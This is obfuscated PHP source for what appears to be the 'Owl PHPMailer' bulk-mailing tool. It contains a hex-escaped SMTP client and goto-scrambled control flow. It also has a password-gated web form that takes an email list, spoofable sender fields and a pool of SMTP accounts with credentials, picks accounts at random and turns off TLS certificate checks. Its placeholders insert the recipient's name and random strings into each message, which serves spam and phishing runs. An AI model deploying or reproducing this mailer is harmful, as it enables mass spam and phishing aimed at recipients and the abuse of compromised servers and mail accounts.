$this->edebug("\x53\x4d\x54\120\40\116\x4f\x54\x49\x43\105\x3a\x20\x45\117\x46\40\143\x61\165\147\x68\164\x20\x77\x68\151\154\x65\40\143\x68\145\143\153\x69\x6e\x67\40\151\146\40\143\x6f\156\156\145\x63\164\x65\x64", self::DEBUG_CLIENT); $this->close(); return false; } return true; } return false; } public function close() { $this->setError(''); $this->server_caps = null; $this->helo_rply = null; if (is_resource($this->smtp_conn)) { fclose($this->smtp_conn); $this->smtp_conn = null; $this->edebug("\103\157\156\156\x65\143\164\151\157\156\72\40\x63\x6c\x6f\163\x65\x64", self::DEBUG_CONNECTION); } } public function data($msg_data) { if (!$this->sendCommand("\104\101\124\101", "\104\101\x54\101", 354)) { return false; } $lines = explode("\xa", str_replace(array("\15\12", "\15"), "\12", $msg_data)); $field = substr($lines[0], 0, strpos($lines[0], "\x3a")); $in_headers = false; if (!empty($field) and strpos($field, "\x20") === false) { $in_headers = true; } foreach ($lines as $line) { $lines_out = array(); if ($in_headers and $line == '') { $in_headers = false; } while (isset($line[self::MAX_LINE_LENGTH])) { $pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), "\x20"); if (!$pos) { $pos = self::MAX_LINE_LENGTH - 1; $lines_out[] = substr($line, 0, $pos); $line = substr($line, $pos); } else { $lines_out[] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } if ($in_headers) { $line = "\11" . $line; } } $lines_out[] = $line; foreach ($lines_out as $line_out) { if (!empty($line_out) and $line_out[0] == "\x2e") { $line_out = "\x2e" . $line_out; } $this->client_send($line_out . static::LE, "\x44\101\x54\x41"); } } $savetimelimit = $this->Timelimit; $this->Timelimit = $this->Timelimit * 2; $result = $this->sendCommand("\104\x41\x54\x41\40\x45\116\104", "\x2e", 250); $this->recordLastTransactionID(); $this->Timelimit = $savetimelimit; return $result; } public function hello($host = '') { return $this->sendHello("\105\x48\x4c\x4f", $host) or $this->sendHello("\110\x45\x4c\x4f", $host); } protected function sendHello($hello, $host) { $noerror = $this->sendCommand($hello, $hello . "\x20" . $host, 250); $this->helo_rply = $this->last_reply; if ($noerror) { $this->parseHelloFields($hello); } else { $this->server_caps = null; } return $noerror; } protected function parseHelloFields($type) { $this->server_caps = array(); $lines = explode("\xa", $this->helo_rply); foreach ($lines as $n => $s) { $s = trim(substr($s, 4)); if (empty($s)) { continue; } $fields = explode("\40", $s); if (!empty($fields)) { if (!$n) { $name = $type; $fields = $fields[0]; } else { $name = array_shift($fields); switch ($name) { case "\x53\111\x5a\105": $fields = $fields ? $fields[0] : 0; break; case "\x41\125\x54\110": if (!is_array($fields)) { $fields = array(); } break; default: $fields = true; } } $this->server_caps[$name] = $fields; } } } public function mail($from) { $useVerp = $this->do_verp ? "\x20\130\126\105\122\120" : ''; return $this->sendCommand("\115\101\111\x4c\40\106\x52\117\115", "\115\101\x49\x4c\x20\106\x52\x4f\115\72\x3c" . $from . "\76" . $useVerp, 250); } public function quit($close_on_error = true) { $noerror = $this->sendCommand("\121\125\111\x54", "\x51\x55\x49\124", 221); $err = $this->error; if ($noerror or $close_on_error) { $this->close(); $this->error = $err; } return $noerror; } public function recipient($address, $dsn = '') { if (empty($dsn)) { $rcpt = "\122\103\120\124\x20\124\x4f\x3a\74" . $address . "\x3e"; } else { $dsn = strtoupper($dsn); $notify = array(); if (strpos($dsn, "\x4e\x45\x56\105\x52") !== false) { $notify[] = "\116\105\x56\105\122"; } else { foreach (array("\123\x55\x43\x43\105\x53\x53", "\x46\101\111\x4c\125\122\105", "\104\105\x4c\101\131") as $value) { if (strpos($dsn, $value) !== false) { $notify[] = $value; } } } $rcpt = "\122\x43\120\x54\x20\124\x4f\72\74" . $address . "\x3e\40\116\x4f\x54\111\106\x59\x3d" . implode("\x2c", $notify); } return $this->sendCommand("\122\103\x50\124\x20\124\117", $rcpt, array(250, 251)); } public function reset() { return $this->sendCommand("\122\x53\105\x54", "\122\x53\x45\x54", 250); } protected function sendCommand($command, $commandstring, $expect) { if (!$this->connected()) { $this->setError("\103\141\x6c\x6c\145\144\40{$command}\40\167\151\164\x68\157\165\x74\x20\x62\145\151\156\147\40\143\x6f\156\156\145\143\x74\145\x64"); return false; } if (strpos($commandstring, "\12") !== false or strpos($commandstring, "\15") !== false) { $this->setError("\103\x6f\x6d\x6d\141\x6e\144\40\47{$command}\x27\40\x63\157\156\x74\141\x69\156\x65\144\x20\x6c\151\x6e\145\40\x62\x72\x65\x61\x6b\x73"); return false; } $this->client_send($commandstring . static::LE, $command); $this->last_reply = $this->get_lines(); $matches = array(); if (preg_match("\x2f\136\x28\133\60\55\71\x5d\x7b\x33\175\51\133\x20\55\x5d\x28\77\x3a\x28\133\60\55\71\135\134\x2e\x5b\x30\x2d\x39\135\134\56\133\60\x2d\71\135\x7b\x31\x2c\x32\x7d\51\40\x29\x3f\57", $this->last_reply, $matches)) { $code = $matches[1]; $code_ex = count($matches) > 2 ? $matches[2] : null; $detail = preg_replace("\x2f{$code}\133\x20\x2d\x5d" . ($code_ex ? str_replace("\x2e", "\134\56", $code_ex) . "\x20" : '') . "\57\155", '', $this->last_reply); } else { $code = substr($this->last_reply, 0, 3); $code_ex = null; $detail = substr($this->last_reply, 4); } $this->edebug("\123\105\x52\126\x45\122\40\55\76\40\x43\114\111\x45\116\x54\72\x20" . $this->last_reply, self::DEBUG_SERVER); if (!in_array($code, (array) $expect)) { $this->setError("{$command}\40\x63\157\x6d\x6d\x61\x6e\144\x20\146\141\151\154\145\x64", $detail, $code, $code_ex); $this->edebug("\x53\x4d\x54\120\40\x45\x52\x52\117\122\72\x20" . $this->error["\145\x72\x72\x6f\x72"] . "\72\x20" . $this->last_reply, self::DEBUG_CLIENT); return false; } $this->setError(''); return true; } public function sendAndMail($from) { return $this->sendCommand("\123\101\115\x4c", "\x53\101\x4d\114\x20\106\122\x4f\115\x3a{$from}", 250); } public function verify($name) { return $this->sendCommand("\x56\x52\x46\131", "\x56\122\106\131\40{$name}", array(250, 251)); } public function noop() { return $this->sendCommand("\x4e\x4f\117\120", "\116\117\117\x50", 250); } public function turn() { $this->setError("\x54\150\x65\40\123\115\x54\120\x20\124\x55\122\116\40\x63\x6f\155\155\141\x6e\144\x20\x69\163\40\156\157\164\x20\x69\155\x70\x6c\145\x6d\x65\156\x74\145\x64"); $this->edebug("\x53\115\x54\x50\x20\x4e\x4f\x54\x49\x43\105\72\40" . $this->error["\145\162\162\157\162"], self::DEBUG_CLIENT); return false; } public function client_send($data, $command = '') { if (self::DEBUG_LOWLEVEL > $this->do_debug and in_array($command, array("\125\x73\x65\162\x20\x26\x20\x50\x61\163\x73\x77\x6f\x72\144", "\125\x73\x65\162\156\x61\x6d\x65", "\x50\x61\x73\163\167\x6f\162\x64"), true)) { $this->edebug("\x43\x4c\x49\105\x4e\124\40\x2d\x3e\40\x53\x45\x52\x56\105\122\x3a\40\x3c\143\x72\145\x64\145\x6e\x74\151\141\x6c\x73\x20\x68\151\x64\144\145\156\76", self::DEBUG_CLIENT); } else { $this->edebug("\103\x4c\x49\105\116\x54\x20\x2d\x3e\40\123\x45\122\126\x45\x52\72\x20" . $data, self::DEBUG_CLIENT); } set_error_handler(array($this, "\x65\162\162\157\162\110\141\x6e\144\x6c\x65\x72")); $result = fwrite($this->smtp_conn, $data); restore_error_handler(); return $result; } public function getError() { return $this->error; } public function getServerExtList() { return $this->server_caps; } public function getServerExt($name) { if (!$this->server_caps) { $this->setError("\x4e\x6f\x20\110\105\x4c\x4f\57\x45\110\x4c\x4f\x20\167\x61\163\40\x73\145\156\x74"); return; } if (!array_key_exists($name, $this->server_caps)) { if ("\x48\105\x4c\117" == $name) { return $this->server_caps["\105\x48\114\x4f"]; } if ("\x45\x48\114\117" == $name || array_key_exists("\x45\x48\114\x4f", $this->server_caps)) { return false; } $this->setError("\110\105\x4c\117\40\x68\x61\156\x64\x73\150\141\153\145\40\x77\141\163\40\165\163\x65\x64\x3b\40\116\x6f\x20\151\156\146\157\x72\x6d\141\x74\151\x6f\x6e\40\141\x62\x6f\x75\164\x20\163\x65\x72\166\x65\x72\x20\x65\x78\x74\x65\156\163\x69\157\156\163\40\x61\x76\141\x69\x6c\141\142\x6c\x65"); return; } return $this->server_caps[$name]; } public function getLastReply() { return $this->last_reply; } protected function get_lines() { if (!is_resource($this->smtp_conn)) { return ''; } $data = ''; $endtime = 0; stream_set_timeout($this->smtp_conn, $this->Timeout); if ($this->Timelimit > 0) { $endtime = time() + $this->Timelimit; } $selR = array($this->smtp_conn); $selW = null; while (is_resource($this->smtp_conn) and !feof($this->smtp_conn)) { if (!stream_select($selR, $selW, $selW, $this->Timelimit)) { $this->edebug("\123\115\124\x50\40\x2d\x3e\x20\x67\x65\x74\137\x6c\151\x6e\x65\163\x28\x29\x3a\x20\164\151\155\x65\x64\55\x6f\165\x74\x20\x28" . $this->Timeout . "\x20\x73\145\143\51", self::DEBUG_LOWLEVEL); break; } $str = @fgets($this->smtp_conn, 515); $this->edebug("\x53\115\x54\120\40\x49\x4e\102\x4f\x55\116\x44\x3a\40\x22" . trim($str) . "\42", self::DEBUG_LOWLEVEL); $data .= $str; if (!isset($str[3]) or isset($str[3]) and $str[3] == "\40") { break; } $info = stream_get_meta_data($this->smtp_conn); if ($info["\x74\151\x6d\145\144\137\x6f\165\164"]) { $this->edebug("\123\x4d\124\120\40\55\x3e\x20\x67\x65\x74\x5f\x6c\x69\156\x65\x73\50\x29\72\40\x74\151\155\x65\144\x2d\x6f\165\164\x20\50" . $this->Timeout . "\x20\x73\145\143\x29", self::DEBUG_LOWLEVEL); break; } if ($endtime and time() > $endtime) { $this->edebug("\x53\x4d\124\x50\40\x2d\76\40\x67\x65\164\137\154\x69\x6e\145\163\x28\x29\72\40\164\x69\x6d\x65\154\x69\x6d\x69\164\x20\162\145\x61\x63\150\145\x64\40\50" . $this->Timelimit . "\x20\163\x65\x63\x29", self::DEBUG_LOWLEVEL); break; } } return $data; } public function setVerp($enabled = false) { $this->do_verp = $enabled; } public function getVerp() { return $this->do_verp; } protected function setError($message, $detail = '', $smtp_code = '', $smtp_code_ex = '') { $this->error = array("\145\x72\x72\157\162" => $message, "\x64\145\164\141\x69\154" => $detail, "\x73\x6d\164\160\x5f\143\157\144\145" => $smtp_code, "\x73\x6d\164\160\137\x63\x6f\x64\145\x5f\x65\170" => $smtp_code_ex); } public function setDebugOutput($method = "\145\143\x68\x6f") { $this->Debugoutput = $method; } public function getDebugOutput() { return $this->Debugoutput; } public function setDebugLevel($level = 0) { $this->do_debug = $level; } public function getDebugLevel() { return $this->do_debug; } public function setTimeout($timeout = 0) { $this->Timeout = $timeout; } public function getTimeout() { return $this->Timeout; } protected function errorHandler($errno, $errmsg, $errfile = '', $errline = 0) { $notice = "\x43\157\x6e\156\145\143\164\151\x6f\156\x20\x66\141\151\154\x65\144\56"; $this->setError($notice, $errmsg, (string) $errno); $this->edebug("{$notice}\x20\x45\162\x72\x6f\162\x20\43{$errno}\x3a\40{$errmsg}\40\x5b{$errfile}\40\x6c\x69\156\x65\40{$errline}\x5d", self::DEBUG_CONNECTION); } protected function recordLastTransactionID() { $reply = $this->getLastReply(); if (empty($reply)) { $this->last_smtp_transaction_id = null; } else { $this->last_smtp_transaction_id = false; foreach ($this->smtp_transaction_id_patterns as $smtp_transaction_id_pattern) { if (preg_match($smtp_transaction_id_pattern, $reply, $matches)) { $this->last_smtp_transaction_id = trim($matches[1]); break; } } } return $this->last_smtp_transaction_id; } public function getLastTransactionID() { return $this->last_smtp_transaction_id; } } goto KMPxz; g1bM9: ?>
)</li>
                <li>[-emailuser-] : <b>Email User</b> (emailuser@emaildomain)</li>
                <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
                <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
                <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
                <li>[-randommd5-] : <b>Random MD5 </b></li>
                <li>[-smtpuser-] : <b>SMTP Username</b></li>
                <li>[-smtpserver-] : <b>SMTP Server Domain</b> (e.g., architects.lk)</li>
            </ul>
            <h4>example</h4>
            Reciver Email = <b>user@domain.com</b><br>
            <ul>
                <li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>
                <li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
            </ul>
            <h6>by <b><a href="http://<?php  goto YIR25; Y5bRN: function processEmailSendingRequest() { if (!is_email($GLOBALS["\x72\x65\143\x69\x70\151\x65\156\164"])) { die("\111\156\143\x6f\162\162\145\143\164\x20\x45\x6d\141\151\154"); } $mail = setSendingMethod(); $fromEmail = owlClear($GLOBALS["\x73\145\x6e\144\x65\162\105\x6d\141\x69\x6c"], $GLOBALS["\x72\145\x63\x69\160\x69\x65\156\164"]); $fromName = owlClear($GLOBALS["\x73\145\156\144\x65\162\x4e\x61\x6d\145"], $GLOBALS["\x72\x65\x63\151\160\x69\145\156\x74"]); $replyTo = owlClear($GLOBALS["\162\x65\x70\154\x79\x54\157"], $GLOBALS["\x72\145\x63\x69\160\151\145\x6e\164"]); $recipient = $GLOBALS["\x72\145\143\x69\160\x69\145\156\x74"]; $subject = owlClear($GLOBALS["\x6d\x65\163\163\x61\147\x65\123\165\142\x6a\145\x63\164"], $GLOBALS["\x72\145\143\151\160\151\x65\x6e\x74"]); $body = owlClear($GLOBALS["\155\x65\163\x73\x61\147\x65\x4c\145\164\x74\x65\162"], $GLOBALS["\162\145\x63\x69\x70\x69\x65\156\x74"]); $altBody = owlClear($GLOBALS["\x61\154\x74\x4d\x65\x73\x73\x61\x67\145\114\145\x74\x74\145\162"], $GLOBALS["\162\145\143\151\160\151\145\x6e\x74"]); $charSet = $GLOBALS["\145\x6e\x63\157\144\x69\x6e\x67\124\171\160\145"]; $messageType = $GLOBALS["\155\145\x73\163\141\x67\x65\x54\x79\x70\x65"]; $emailPriority = $GLOBALS["\145\x6d\141\x69\154\x50\162\x69\x6f\162\151\x74\171"]; $mail->setFrom($fromEmail, $fromName); if (isset($replyTo) && $replyTo !== '') { $mail->addReplyTo($replyTo); } $mail->addAddress($recipient); if (isset($subject) && $subject !== '') { $mail->Subject = $subject; } if (isset($body) && $body !== '') { $mail->Body = $body; } if (isset($charSet) && $charSet !== '') { $mail->CharSet = $charSet; } if (isset($emailPriority) && $emailPriority !== '') { $mail->Priority = $emailPriority; } if (isset($altBody) && $altBody !== '') { $mail->AltBody = $altBody; } if (isset($_FILES["\141\164\x74\x61\x63\x68\x6d\x65\x6e\164"])) { for ($i = 0; $i < count($_FILES["\141\164\x74\141\x63\150\x6d\145\156\x74"]["\x6e\141\x6d\x65"]); $i++) { if ($_FILES["\x61\164\x74\141\143\150\x6d\145\x6e\164"]["\x74\155\160\137\x6e\x61\x6d\145"][$i] != '') { $mail->AddAttachment($_FILES["\x61\164\x74\141\143\150\x6d\145\156\164"]["\x74\x6d\160\x5f\156\141\x6d\x65"][$i], $_FILES["\x61\x74\x74\141\x63\x68\x6d\x65\156\164"]["\156\x61\x6d\145"][$i]); } } } if ($messageType == "\x68\x74\x6d\x6c") { $mail->IsHTML(true); } else { $mail->IsHTML(false); } if (!$mail->send()) { die($mail->ErrorInfo); } else { die("\117\x4b"); } } goto Jt3ze; gqSrA: ini_set("\155\145\x6d\x6f\162\171\x5f\154\151\x6d\151\164", -1); goto l_KbL; mVE8r: set_time_limit(0); goto gqSrA; IBtEW: session_start(); goto mVE8r; LmVg6: function setSendingMethod() { $mail = new PHPMailer(); if ($GLOBALS["\x73\145\x6e\144\x69\x6e\x67\115\x65\x74\x68\x6f\144"] == "\163\x6d\x74\160") { $mail->IsSMTP(); $parts = explode("\72", $GLOBALS["\163\155\x74\x70\101\143\143\164"]); $mail->Host = owlTrim($parts[0]); $mail->Port = owlTrim($parts[1]); if (owlTrim($parts[2]) == "\163\x73\x6c") { $mail->SMTPSecure = "\x73\x73\154"; } else { if (owlTrim($parts[2]) == "\x74\154\163") { $mail->SMTPSecure = "\x74\154\163"; } else { $mail->SMTPSecure = ''; } } if (isset($parts[3]) && isset($parts[4])) { $mail->SMTPAuth = true; $mail->Username = owlTrim($parts[3]); $mail->Password = owlTrim($parts[4]); } $mail->SMTPOptions = array("\163\163\x6c" => array("\x76\145\x72\x69\x66\171\137\160\x65\x65\x72" => false, "\x76\145\162\x69\146\171\137\x70\145\x65\162\137\156\141\x6d\145" => false, "\x61\154\x6c\157\x77\137\163\145\x6c\146\137\x73\x69\x67\156\x65\144" => true)); } return $mail; } goto Y5bRN; a2nuF: header("\101\143\x63\x65\x73\x73\x2d\x43\x6f\x6e\164\162\157\154\55\x41\154\154\157\167\x2d\117\x72\x69\x67\x69\x6e\x3a\x20\x2a"); goto MtSlb; koFUB: ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE = edge">
  <meta name="viewport" content="width = device-width, initial-scale = 1">
  <title>Owl PHPMailer <?php  goto CfT7M; kSVba: function is_email($input) { $email_pattern = "\x2f\x5e\x28\x5b\141\x2d\172\101\x2d\132\x30\55\71\x5c\x2d\134\137\x5c\x2e\135\x7b\x31\54\x7d\51\x2b\x40\53\x28\x5b\141\55\172\101\55\132\x30\55\71\x5c\x2d\x5c\x5f\x5c\56\135\173\x31\x2c\x7d\x29\53\x5c\x2e\53\50\x5b\141\x2d\172\135\x7b\62\54\x34\x7d\51\x24\x2f\151"; if (preg_match($email_pattern, $input)) { return TRUE; } } goto PgI_k; oFeLq: echo date("\x6d\57\144\57\x59\40\x68\x3a\x69\72\x73\40\141", time()); goto g1bM9; s35QL: echo $owl["\167\x65\142\x73\x69\164\145"]; goto ZADL0; x2TAy: echo $_SERVER["\x53\x45\122\x56\x45\122\137\x41\104\104\122"]; goto MCm_n; oov1b: $subdomains_to_remove = array("\155\x61\x69\x6c\56", "\x73\x6d\x74\x70\x2e", "\x77\145\x62\155\141\x69\154\56", "\145\x6d\x61\x69\x6c\56"); goto do62A; JvBgl: function randString($consonants, $min_length, $max_length) { $length = rand($min_length, $max_length); $password = ''; for ($i = 0; $i < $length; $i++) { $password .= $consonants[rand() % strlen($consonants)]; } return $password; } goto kSVba; icWAc: header("\x43\141\143\x68\145\55\103\x6f\x6e\x74\x72\157\154\72\x20\x70\x6f\163\x74\x2d\143\x68\145\143\x6b\75\60\x2c\40\160\162\x65\55\x63\x68\145\143\x6b\75\x30", false); goto mXdsU; hRtN8: function owlClear($text, $email) { $smtpUser = ''; $smtpServer = ''; if (!empty($GLOBALS["\x73\x6d\164\160\101\x63\143\164"])) { $parts = explode("\72", $GLOBALS["\163\x6d\164\160\101\143\x63\x74"]); $host = isset($parts[0]) ? owlTrim($parts[0]) : ''; if (isset($parts[3])) { $smtpUser = owlTrim($parts[3]); } if (!empty($host)) { global $subdomains_to_remove; $smtpServer = $host; foreach ($subdomains_to_remove as $subdomain) { if (strpos($smtpServer, $subdomain) === 0) { $smtpServer = substr($smtpServer, strlen($subdomain)); break; } } } } $text = str_replace("\133\x2d\x73\x6d\164\160\x75\x73\145\162\x2d\135", $smtpUser, $text); $text = str_replace("\x5b\55\163\155\164\160\163\145\x72\x76\x65\x72\55\x5d", $smtpServer, $text); $emailuser = preg_replace("\x2f\x28\x5b\136\100\135\52\x29\x2e\52\57", "\x24\61", $email); $text = str_replace("\133\55\x74\151\x6d\145\x2d\x5d", date("\155\57\144\57\x59\40\x68\72\151\72\163\40\x61", time()), $text); $text = str_replace("\x5b\55\x65\x6d\x61\x69\x6c\55\x5d", $email, $text); $text = str_replace("\133\x2d\145\155\x61\151\x6c\165\163\145\x72\x2d\135", $emailuser, $text); $text = str_replace("\x5b\55\x72\x61\156\x64\x6f\155\x6c\145\164\x74\x65\162\x73\55\x5d", randString("\x61\x62\x63\144\x65\146\x67\x68\151\x6a\x6b\x6c\x6d\x6e\x6f\160\x71\162\163\164\165\x76\167\170\x79\x7a", 8, 15), $text); $text = str_replace("\x5b\55\x72\141\156\x64\157\x6d\163\164\162\151\156\147\x2d\135", randString("\x61\142\143\x64\x65\x66\x67\x68\151\x6a\153\x6c\x6d\x6e\157\x70\161\x72\x73\x74\165\x76\167\170\171\172\x30\61\62\63\64\65\x36\67\x38\71", 8, 15), $text); $text = str_replace("\x5b\x2d\162\x61\156\144\x6f\155\156\165\x6d\x62\145\162\x2d\x5d", randString("\60\61\x32\x33\64\x35\x36\x37\x38\x39", 7, 15), $text); $text = str_replace("\133\55\162\x61\156\x64\157\155\x6d\144\65\x2d\135", md5(rand()), $text); return $text; } goto JvBgl; MCm_n: ?>
</b></li>

            </ul>
            <h4>HELP</h4>
            <ul>
                <li>[-email-] : <b>Reciver Email</b></li>
                <li>[-time-] : <b>Date and Time</b> (<?php  goto oFeLq; Jt3ze: function owlTrim($string) { return stripslashes(ltrim(rtrim($string))); } goto hRtN8; nfFPE: if (!isset($_SESSION[$sessioncode])) { $_SESSION[$sessioncode] = ''; } goto KJ5Ln; CfT7M: echo $owl["\x76\x65\162\x73\x69\157\x6e"]; goto sBqBq; KJ5Ln: if (!empty($password) && $_SESSION[$sessioncode] != $password) { if (isset($_REQUEST["\x70\141\163\x73"]) and $_REQUEST["\x70\x61\x73\163"] == $password) { $_SESSION[$sessioncode] = $password; } else { print "\74\160\x72\145\40\x61\x6c\151\147\156\75\143\145\x6e\164\145\162\76\74\146\157\162\155\x20\155\145\x74\150\x6f\x64\x3d\x70\157\163\164\76\120\x61\x73\163\x77\x6f\162\144\72\40\x3c\151\x6e\160\x75\x74\40\164\x79\x70\x65\x3d\47\x70\141\163\x73\167\157\x72\x64\47\x20\156\141\x6d\145\x3d\47\160\x61\163\163\47\76\x3c\151\156\160\165\x74\x20\x74\x79\x70\x65\x3d\x27\x73\x75\x62\155\151\164\47\40\166\141\x6c\x75\x65\75\x27\x3e\x3e\47\x3e\74\x2f\146\x6f\162\x6d\x3e\74\57\x70\162\x65\x3e"; die; } } goto LmVg6; CgtIZ: ?>
</small></h3>
    <div class="row">
      <div class="form-group col-lg-6 ">
        <label for="senderEmail">Sender Email</label>
        <input type="text" class="form-control  input-sm" id="senderEmail" name="senderEmail">
      </div>
      <div class="form-group col-lg-6 ">
        <label for="senderEmail">Sender Name</label>
        <input type="text" class="form-control  input-sm" id="senderName" name="senderName">
      </div>
    </div>
    <div class="row"> <span class="form-group col-lg-6"><label for="attachment">Attachment <small>(Multiple Available)</small></label><input type="file" name="attachment[]" id="attachment" multiple/></span>
      <div class="form-group col-lg-6">
        <label for="replyTo">Reply-to</label>
        <input type="text" class="form-control  input-sm " id="replyTo" name="replyTo" />
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-12 ">
        <label for="subject">Subject</label>
        <input type="text" class="form-control  input-sm " id="subject" name="subject" />
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-6">
        <label for="messageLetter">Message Letter</label>
        <textarea placeholder="Message Letter" name="messageLetter" id="messageLetter" class="form-control" rows="10" id="textArea"></textarea>
      </div>
      <div class="form-group col-lg-6">
        <label for="altMessageLetter">Alternative Message Letter</label>
        <textarea placeholder="Alternative Message Letter.&#10;This body can be read by mail clients that do not have HTML email.&#10;capability such as mutt &#38; Eudora.&#10;Clients that can read HTML will view the normal Body." name="altMessageLetter" id="altMessageLetter" class="form-control" rows="10" id="textArea"></textarea>
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-6 ">
        <label for="emailList">Email List</label>
        <textarea name="emailList" id="emailList" class="form-control" rows="10" id="textArea"></textarea>
      </div>
      <div class="form-group col-lg-6 ">
        <label for="smtpAccounts">SMTP Accounts</label>
        <textarea placeholder="Random account will be used when sending a message.&#10;1) Format: HOST:PORT:SSL&#10;2) Format: HOST:PORT:SSL:Username:Password&#10;Example: smtp.gmail.com:587:tls:xx@gmail.com:123&#10;Example: smtp.gmail.com:587:nossl:xx@gmail.com:123&#10;&#10;SSL Options: tls , ssl, nossl" name="smtpAccounts" id="smtpAccounts" class="form-control" rows="10" id="textArea"></textarea>
      </div>
    </div>

    <div class="row">
      <div class="form-group col-lg-6 ">
      <label for="messageType">Message Type</label>
      <input type="radio" name="messageType" id="messageType" value="html" checked> HTML
      <input type="radio" name="messageType" id="messageType" value="plain"> Plain
    </div>
    <div class="form-group col-lg-6 ">
      <label for="sendingMethod">Sending Method</label>
      <input type="radio" name="sendingMethod" id="sendingMethod" value="builtin" checked> Builtin
      <input type="radio" name="sendingMethod" id="sendingMethod" value="smtp"> SMTP
    </div>
    <div class="form-group col-lg-6">
      <label for="encoding">Encoding Type</label>
      <select class="form-control input-sm" id="encoding" name="encoding">
        <option value="UTF-8" selected>UTF-8 International Unicode</option>
        <option value="ISO-8859-1">ISO-8859-1 Latin 1 (West European)</option>
        <option value="ISO-8859-2">ISO-8859-2 Latin 2 (East European)</option>
        <option value="ISO-8859-3">ISO-8859-3 Latin 3 (South European)</option>
        <option value="ISO-8859-4">ISO-8859-4 Latin 4 (North European)</option>
        <option value="ISO-8859-5">ISO-8859-5 Cyrillic</option>
        <option value="ISO-8859-6">ISO-8859-6 Arabic</option>
        <option value="ISO-8859-7">ISO-8859-7 Greek</option>
        <option value="ISO-8859-8">ISO-8859-8 Hebrew</option>
        <option value="ISO-8859-9">ISO-8859-9 Latin 5 (Turkish)</option>
        <option value="ISO-8859-15">ISO-8859-15 Latin 9</option>
        <option value="BIG5">BIG5 Traditional Chinese</option>
        <option value="GB-2312">GB-2312 Simplified Chinese</option>
        <option value="ISO-2022-JP">ISO-2022-JP Japanese</option>
        <option value="EUC-JP">EUC-JP Japanese</option>
        <option value="Shift-JIS">Shift-JIS Japanese</option>
        <option value="KSC-5601">KSC-5601 Korean</option>
        <option value="EIC-KR">EIC-KR Korean</option>
      </select>
    </div>
    <div class="form-group col-lg-3">
      <label for="priority">Email Priority</label>
      <select class="form-control input-sm" id="priority" name="priority">
        <option value="" selected>Default</option>
        <option value="5">Low</option>
        <option value="3">Normal</option>
        <option value="1">High</option>
      </select>
    </div>
  </div>

<button type="button" id="btnStart" class="btn btn-default btn-sm" onclick="startSending();">Start</button>
<button type="button"id="btnStop" class="btn btn-default btn-sm" onclick="stopSending();">Stop</button>

</div>
  
    <div class="col-lg-6"><br>
        <label for="well">Instruction</label>
        <div id="well" class="well well">
            <h4>Server Information</h4>
            <ul>
                <li>ServerIP : <b> <?php  goto x2TAy; BQjaO: ?>
"><?php  goto s35QL; ZADL0: ?>
</a></b></h6>
        </div>

        <div id="progress" class="col-lg-16">
          
        </div>
    </div>
 
<script>
 $("#btnStart").attr("disabled", false);
 $("#btnStop").attr("disabled", true);
</script>
</body>
<footer></footer>

</htm')); ?>